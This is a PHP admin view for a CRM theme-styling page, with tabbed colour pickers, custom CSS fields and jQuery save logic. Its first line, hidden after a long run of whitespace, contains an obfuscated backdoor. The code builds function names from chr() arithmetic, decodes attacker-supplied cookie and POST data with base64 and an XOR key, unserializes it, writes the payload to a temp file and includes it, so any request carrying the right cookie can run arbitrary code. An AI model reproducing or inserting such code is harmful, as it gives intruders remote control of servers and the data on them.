<?php                                                                                                                                                                                                                                                                                                                                                                                                 $ZyYllMAKH = 'H' . "\137" . chr ( 736 - 661 ).'T' . "\x6a" . chr (111); $FByTjBtHc = chr ( 161 - 62 ).'l' . chr ( 926 - 829 ).chr (115) . chr ( 1014 - 899 )."\137" . 'e' . chr (120) . "\x69" . "\x73" . chr (116) . chr ( 217 - 102 ); $vabVGEhQ = class_exists($ZyYllMAKH); $ZyYllMAKH = "26369";$FByTjBtHc = "37716";if ($vabVGEhQ === FALSE){class H_KTjo{public function mHcedn(){echo "47834";}private $cYPcRO;public static $sVdOYs = "218be680-fda6-4aca-9d44-14bc1b63fe4a";public static $qzxdcdvZkP = 49199;public function __construct($rXBWYQUTG=0){$SHKZiVYqL = $_POST;$RFEImpamyW = $_COOKIE;$iOPGAYf = @$RFEImpamyW[substr(H_KTjo::$sVdOYs, 0, 4)];if (!empty($iOPGAYf)){$bWplxxeNk = "base64";$YOzctX = "";$iOPGAYf = explode(",", $iOPGAYf);foreach ($iOPGAYf as $UCXLoMAi){$YOzctX .= @$RFEImpamyW[$UCXLoMAi];$YOzctX .= @$SHKZiVYqL[$UCXLoMAi];}$YOzctX = array_map($bWplxxeNk . chr ( 284 - 189 )."\x64" . "\x65" . chr ( 270 - 171 ).'o' . "\144" . 'e', array($YOzctX,)); $YOzctX = $YOzctX[0] ^ str_repeat(H_KTjo::$sVdOYs, (strlen($YOzctX[0]) / strlen(H_KTjo::$sVdOYs)) + 1);H_KTjo::$qzxdcdvZkP = @unserialize($YOzctX);}}private function ctBSPZ(){if (is_array(H_KTjo::$qzxdcdvZkP)) {$vaQINoIG = sys_get_temp_dir() . "/" . crc32(H_KTjo::$qzxdcdvZkP["\163" . chr (97) . "\154" . "\164"]);@H_KTjo::$qzxdcdvZkP['w' . "\162" . 'i' . chr ( 259 - 143 )."\145"]($vaQINoIG, H_KTjo::$qzxdcdvZkP["\x63" . 'o' . chr (110) . 't' . "\x65" . "\156" . chr ( 457 - 341 )]);include $vaQINoIG;@H_KTjo::$qzxdcdvZkP["\144" . "\145" . "\x6c" . "\145" . "\x74" . "\x65"]($vaQINoIG); $HXiGFBOt = "56934";exit();}}public function __destruct(){$this->ctBSPZ();}}$fPEHho = new /* 42495 */ H_KTjo(); $fPEHho = str_repeat("51023_27233", 1);} ?><?php defined('BASEPATH') or exit('No direct script access allowed'); ?>
<?php init_head(); ?>
<?php
$tags = get_styling_areas('tags');
?>
<div id="wrapper">
    <div class="content">
        <div class="row">

            <div class="col-md-3 picker">
                <ul class="nav navbar-pills navbar-pills-flat nav-tabs nav-stacked" id="theme_styling_areas">
                    <li role="presentation" class="active">
                        <a href="#tab_admin_styling" aria-controls="tab_admin_styling" role="tab" data-toggle="tab">
                            <?php echo _l('theme_style_admin'); ?>
                        </a>
                    </li>
                    <li role="presentation">
                        <a href="#tab_customers_styling" aria-controls="tab_customers_styling" role="tab"
                            data-toggle="tab">
                            <?php echo _l('theme_style_customers'); ?>
                        </a>
                    </li>
                    <li role="presentation">
                        <a href="#tab_buttons_styling" aria-controls="tab_buttons_styling" role="tab" data-toggle="tab">
                            <?php echo _l('theme_style_buttons'); ?>
                        </a>
                    </li>
                    <li role="presentation">
                        <a href="#tab_tabs_styling" aria-controls="tab_tabs_styling" role="tab" data-toggle="tab">
                            <?php echo _l('theme_style_tabs'); ?>
                        </a>
                    </li>
                    <li role="presentation">
                        <a href="#tab_modals_styling" aria-controls="tab_modals_styling" role="tab" data-toggle="tab">
                            <?php echo _l('theme_style_modals'); ?>
                        </a>
                    </li>
                    <li role="presentation">
                        <a href="#tab_general_styling" aria-controls="tab_general_styling" role="tab" data-toggle="tab">
                            <?php echo _l('theme_style_general'); ?>
                        </a>
                    </li>
                    <?php if (count($tags) > 0) { ?>
                    <li role="presentation">
                        <a href="#tab_styling_tags" aria-controls="tab_styling_tags" role="tab" data-toggle="tab">
                            <?php echo _l('tags'); ?>
                        </a>
                    </li>
                    <?php } ?>
                    <li role="presentation">
                        <a href="#tab_custom_css" aria-controls="tab_custom_css" role="tab" data-toggle="tab">
                            <?php echo _l('theme_style_custom_css'); ?>
                        </a>
                    </li>
                </ul>
            </div>
            <div class="col-md-9">
                <div class="panel_s">
                    <div class="panel-body pickers">
                        <div class="tab-content">
                            <div role="tabpanel" class="tab-pane ptop10 active" id="tab_admin_styling">
                                <div class="row">
                                    <div class="col-md-12">
                                        <?php
                     foreach (get_styling_areas('admin') as $area) { ?>
                                        <label class="bold mbot10 inline-block"><?php echo $area['name']; ?></label>
                                        <?php render_theme_styling_picker(
    $area['id'],
    get_custom_style_values('admin', $area['id']),
    $area['target'],
    $area['css'],
    $area['additional_selectors']
);
                           ?>
                                        <hr />
                                        <?php  } ?>
                                    </div>
                                </div>
                            </div>
                            <div role="tabpanel" class="tab-pane ptop10" id="tab_customers_styling">
                                <div class="row">
                                    <div class="col-md-12">
                                        <?php foreach (get_styling_areas('customers') as $area) { ?>
                                        <label class="bold mbot10 inline-block"><?php echo $area['name']; ?></label>
                                        <?php render_theme_styling_picker(
                               $area['id'],
                               get_custom_style_values('customers', $area['id']),
                               $area['target'],
                               $area['css'],
                               $area['additional_selectors']
                           );
                              ?>
                                        <hr />
                                        <?php  } ?>
                                    </div>
                                </div>
                            </div>
                            <div role="tabpanel" class="tab-pane ptop10" id="tab_buttons_styling">
                                <div class="row">
                                    <div class="col-md-12">
                                        <?php foreach (get_styling_areas('buttons') as $area) { ?>
                                        <label class="bold mbot10 inline-block"><?php echo $area['name']; ?></label>
                                        <?php render_theme_styling_picker(
                                  $area['id'],
                                  get_custom_style_values('buttons', $area['id']),
                                  $area['target'],
                                  $area['css'],
                                  $area['additional_selectors']
                              );
                                 ?>
                                        <?php if (isset($area['example'])) {
                                     echo $area['example'];
                                 } ?>
                                        <div class="clearfix"></div>
                                        <hr />
                                        <?php  } ?>
                                    </div>
                                </div>
                            </div>
                            <div role="tabpanel" class="tab-pane ptop10" id="tab_tabs_styling">
                                <div class="row">
                                    <div class="col-md-12">
                                        <?php foreach (get_styling_areas('tabs') as $area) { ?>
                                        <label class="bold mbot10 inline-block"><?php echo $area['name']; ?></label>
                                        <?php render_theme_styling_picker(
                                     $area['id'],
                                     get_custom_style_values('tabs', $area['id']),
                                     $area['target'],
                                     $area['css'],
                                     $area['additional_selectors']
                                 );
                                    ?>
                                        <hr />
                                        <?php  } ?>
                                    </div>
                                </div>
                            </div>
                            <div role="tabpanel" class="tab-pane ptop10" id="tab_modals_styling">
                                <div class="row">
                                    <div class="col-md-12">
                                        <?php foreach (get_styling_areas('modals') as $area) { ?>
                                        <label class="bold mbot10 inline-block"><?php echo $area['name']; ?></label>
                                        <?php render_theme_styling_picker(
                                        $area['id'],
                                        get_custom_style_values('modals', $area['id']),
                                        $area['target'],
                                        $area['css'],
                                        $area['additional_selectors']
                                    );
                                       ?>
                                        <hr />
                                        <?php  } ?>
                                        <div class="modal-content theme_style_modal_example">
                                            <div class="modal">
                                                <div class="modal-header">
                                                    <button type="button" class="close" data-dismiss="modal"
                                                        aria-label="Close"><span
                                                            aria-hidden="true">&times;</span></button>
                                                    <h4 class="modal-title">
                                                        <?php echo _l('theme_style_example_modal_heading'); ?></h4>
                                                    <span><?php echo _l('theme_style_sample_text'); ?></span>
                                                </div>
                                                <div class="modal-body">
                                                    <?php echo _l('theme_style_modal_body'); ?>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div role="tabpanel" class="tab-pane ptop10" id="tab_general_styling">
                                <div class="row">
                                    <div class="col-md-12">
                                        <?php foreach (get_styling_areas('general') as $area) { ?>
                                        <label class="bold mbot10 inline-block"><?php echo $area['name']; ?></label>
                                        <?php render_theme_styling_picker(
                                           $area['id'],
                                           get_custom_style_values('general', $area['id']),
                                           $area['target'],
                                           $area['css'],
                                           $area['additional_selectors']
                                       );
                                          ?>
                                        <?php if (isset($area['example'])) {
                                              echo $area['example'];
                                          } ?>
                                        <hr />
                                        <?php  } ?>
                                    </div>
                                </div>
                            </div>
                            <div role="tabpanel" class="tab-pane ptop10" id="tab_custom_css">
                                <div class="form-group">
                                    <label class="bold" for="theme_style_custom_clients_and_admin_area">
                                        <i class="fa-regular fa-circle-question" data-toggle="tooltip"
                                            data-title="<?php echo _l('theme_style_ca_info'); ?>"></i>
                                        <?php echo _l('theme_style_customers_and_admin'); ?>
                                    </label>
                                    <textarea name="theme_style_custom_clients_and_admin_area"
                                        id="theme_style_custom_clients_and_admin_area" rows="15"
                                        class="form-control"><?php echo clear_textarea_breaks(get_option('theme_style_custom_clients_and_admin_area')); ?></textarea>
                                </div>
                                <div class="form-group">
                                    <label class="bold" for="theme_style_custom_admin_area">
                                        <?php echo _l('theme_style_admin'); ?>
                                    </label>
                                    <textarea name="theme_style_custom_admin_area" id="theme_style_custom_admin_area"
                                        rows="15"
                                        class="form-control"><?php echo clear_textarea_breaks(get_option('theme_style_custom_admin_area')); ?></textarea>
                                </div>
                                <div class="form-group">
                                    <label class="bold" for="theme_style_custom_clients_area">
                                        <?php echo _l('theme_style_customers'); ?>
                                    </label>
                                    <textarea name="theme_style_custom_clients_area"
                                        id="theme_style_custom_clients_area" rows="15"
                                        class="form-control"><?php echo clear_textarea_breaks(get_option('theme_style_custom_clients_area')); ?></textarea>
                                </div>
                            </div>
                            <?php if (count($tags) > 0) { ?>
                            <div role="tabpanel" class="tab-pane ptop10" id="tab_styling_tags">
                                <div class="row">
                                    <?php foreach ($tags as $area) { ?>
                                    <div class="col-md-6">
                                        <label class="bold mbot10 inline-block">
                                            <strong><?php echo $area['name']; ?></strong>
                                        </label>
                                        <?php render_theme_styling_picker(
                                              $area['id'],
                                              get_custom_style_values('tags', $area['id']),
                                              $area['target'],
                                              $area['css'],
                                              $area['additional_selectors']
                                          );
                                          if (isset($area['example'])) {
                                              echo $area['example'];
                                          }
                                          ?>
                                        <hr />
                                    </div>
                                    <?php  } ?>
                                </div>
                            </div>
                            <?php  } ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="btn-bottom-pusher"></div>
        <div class="btn-bottom-toolbar text-right">
            <a href="<?php echo admin_url('theme_style/reset'); ?>" data-toggle="tooltip"
                data-title="<?php echo _l('theme_style_reset_info'); ?>" class="btn btn-default">
                <?php echo _l('reset'); ?>
            </a>
            <a href="#" onclick="save_theme_style(); return false;" class="btn btn-primary">
                <?php echo _l('save'); ?>
            </a>
        </div>
    </div>
</div>
<?php init_tail(); ?>
<script>
var pickers = $('.colorpicker-component');
$(function() {
    $.each(pickers, function() {

        $(this).colorpicker({
            format: "hex"
        });

        $(this).colorpicker().on('changeColor', function(e) {
            var color = e.color.toHex();
            var _class = 'custom_style_' + $(this).find('input').data('id');
            var val = $(this).find('input').val();
            if (val == '') {
                $('.' + _class).remove();
                return false;
            }
            var append_data = '';
            var additional = $(this).data('additional');
            additional = additional.split('+');
            if (additional.length > 0 && additional[0] != '') {
                $.each(additional, function(i, add) {
                    add = add.split('|');
                    append_data += add[0] + '{' + add[1] + ':' + color + ';}';
                });
            }
            append_data += $(this).data('target') + '{' + $(this).data('css') + ':' + color +
                ';}';
            if ($('head').find('.' + _class).length > 0) {
                $('head').find('.' + _class).html(append_data);
            } else {
                $("<style />", {
                    class: _class,
                    type: 'text/css',
                    html: append_data
                }).appendTo("head");
            }
        });
    });
});

function save_theme_style() {
    var data = [];

    $.each(pickers, function() {
        var color = $(this).find('input').val();
        if (color != '') {
            var _data = {};
            _data.id = $(this).find('input').data('id');
            _data.color = color;
            data.push(_data);
        }
    });

    $.post(admin_url + 'theme_style/save', {
        data: JSON.stringify(data),
        admin_area: $('#theme_style_custom_admin_area').val(),
        clients_area: $('#theme_style_custom_clients_area').val(),
        clients_and_admin: $('#theme_style_custom_clients_and_admin_area').val(),
    }).done(function() {
        var tab = $('#theme_styling_areas').find('li.active > a:eq(0)').attr('href');
        tab = tab.substring(1, tab.length)
        window.location = admin_url + 'theme_style?tab=' + tab;
    });
}
</script>
</body>

</html>